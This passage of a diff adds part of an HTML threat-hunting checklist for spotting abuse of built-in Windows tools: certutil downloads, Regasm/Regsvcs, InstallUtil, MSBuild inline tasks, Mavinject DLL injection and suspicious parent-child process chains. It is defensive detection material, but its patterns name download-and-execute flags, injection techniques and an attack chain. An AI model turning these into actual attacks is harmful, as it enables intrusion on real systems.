+  <li><label><input type="checkbox"> Check Certutil with -urlcache and -f downloading .exe, .dll, .ps1</label></li>
+  <li><label><input type="checkbox"> Review downloads to %TEMP%, %APPDATA%, C:\Users\Public\</label></li>
+  <li><label><input type="checkbox"> Monitor -decode or -decodehex creating executable files</label></li>
+  <li><label><input type="checkbox"> Identify network connections from certutil.exe to external IPs</label></li>
+  <li><label><input type="checkbox"> Look for Certutil downloading from IP addresses vs. domains</label></li>
+  <li><label><input type="checkbox"> Check parent processes: Office apps, browsers, scripts launching Certutil</label></li>
+  <li><label><input type="checkbox"> Review Certutil executed after phishing email or document opening</label></li>
+  <li><label><input type="checkbox"> Monitor downloaded files executed shortly after Certutil completion</label></li>
+</ul>
+
+<h2>6. Regasm/Regsvcs Assembly Execution</h2>
+<ul>
+  <li><label><input type="checkbox"> Check Regasm/Regsvcs executing assemblies from %TEMP%, %APPDATA%, C:\Users\Public\</label></li>
+  <li><label><input type="checkbox"> Review network connections from regasm.exe or regsvcs.exe</label></li>
+  <li><label><input type="checkbox"> Monitor execution on systems without development tools</label></li>
+  <li><label><input type="checkbox"> Identify user accounts executing that aren’t developers</label></li>
+  <li><label><input type="checkbox"> Look for recently downloaded/created DLLs immediately registered</label></li>
+  <li><label><input type="checkbox"> Check /U (unregister) used to execute malicious code</label></li>
+  <li><label><input type="checkbox"> Review parent processes: Office apps, browsers, scripts</label></li>
+  <li><label><input type="checkbox"> Monitor Regasm/Regsvcs spawning cmd.exe, powershell.exe</label></li>
+</ul>
+
+<h2>7. Installutil Malicious Installer Execution</h2>
+<ul>
+  <li><label><input type="checkbox"> Check InstallUtil executing assemblies from %TEMP%, %APPDATA%, C:\Users\Public\</label></li>
+  <li><label><input type="checkbox"> Review /logfile= set to empty or null (hiding logs)</label></li>
+  <li><label><input type="checkbox"> Monitor /LogToConsole=false suppressing output</label></li>
+  <li><label><input type="checkbox"> Identify network connections from installutil.exe</label></li>
+  <li><label><input type="checkbox"> Look for execution on servers without Visual Studio or .NET SDK</label></li>
+  <li><label><input type="checkbox"> Check InstallUtil spawning cmd.exe, powershell.exe</label></li>
+  <li><label><input type="checkbox"> Review /U (uninstall) parameter triggering malicious code</label></li>
+  <li><label><input type="checkbox"> Monitor parent processes: Office apps, browsers, scripts</label></li>
+</ul>
+
+<h2>8. MSBuild Inline Code Execution</h2>
+<ul>
+  <li><label><input type="checkbox"> Check MSBuild executing .csproj or .xml from %TEMP%, %APPDATA%, C:\Users\Public\</label></li>
+  <li><label><input type="checkbox"> Review XML project files with inline <code>Code</code> sections (C# or <a href="http://VB.NET">VB.NET</a>)</label></li>
+  <li><label><input type="checkbox"> Monitor MSBuild on systems without Visual Studio or .NET development tools</label></li>
+  <li><label><input type="checkbox"> Identify network connections from msbuild.exe</label></li>
+  <li><label><input type="checkbox"> Look for project files downloaded then immediately built</label></li>
+  <li><label><input type="checkbox"> Check MSBuild spawning cmd.exe, powershell.exe, malware</label></li>
+  <li><label><input type="checkbox"> Review <code>UsingTask</code> elements with suspicious inline tasks</label></li>
+  <li><label><input type="checkbox"> Monitor MSBuild during off-hours or by non-developer accounts</label></li>
+</ul>
+
+<h2>9. Mavinject DLL Injection</h2>
+<ul>
+  <li><label><input type="checkbox"> Check Mavinject injecting DLLs from %TEMP%, %APPDATA%, C:\Users\Public\</label></li>
+  <li><label><input type="checkbox"> Review target processes: explorer.exe, svchost.exe, browsers, security tools</label></li>
+  <li><label><input type="checkbox"> Monitor DLLs without digital signatures or untrusted signatures</label></li>
+  <li><label><input type="checkbox"> Identify Sysmon Event ID 8 (CreateRemoteThread) from Mavinject</label></li>
+  <li><label><input type="checkbox"> Look for network connections from processes after injection</label></li>
+  <li><label><input type="checkbox"> Check Mavinject by non-administrative or system accounts</label></li>
+  <li><label><input type="checkbox"> Review parent processes: Office apps, browsers, malicious processes</label></li>
+  <li><label><input type="checkbox"> Monitor injection immediately following malware execution</label></li>
+</ul>
+
+<h2>10. Suspicious Parent-Child Relationships</h2>
+<ul>
+  <li><label><input type="checkbox"> Check winword.exe, excel.exe, outlook.exe spawning rundll32.exe, mshta.exe, regsvr32.exe</label></li>
+  <li><label><input type="checkbox"> Review chrome.exe, firefox.exe, iexplore.exe as parent of system binaries</label></li>
+  <li><label><input type="checkbox"> Monitor execution chains: winword.exe → powershell.exe → certutil.exe → rundll32.exe</label></li>
+  <li><label><input type="checkbox"> Identify scripting hosts (wscript.exe, cscript.exe) spawning system binaries</label></li>
+  <li><label><input type="checkbox"> Look for PDF readers spawning mshta.exe or regsvr32.exe</label></li>
+  <li><label><input type="checkbox"> Check web server processes (w3wp.exe) spawning system proxy binaries</label></li>
+  <li><label><input type="checkbox"> Review email clients spawning mshta.exe or rundll32.exe</label></li>
+  <li><label><input type="checkbox"> Monitor multiple system binaries in sequence from same parent</label></li>
+</ul>
+
+</body>
+</html>
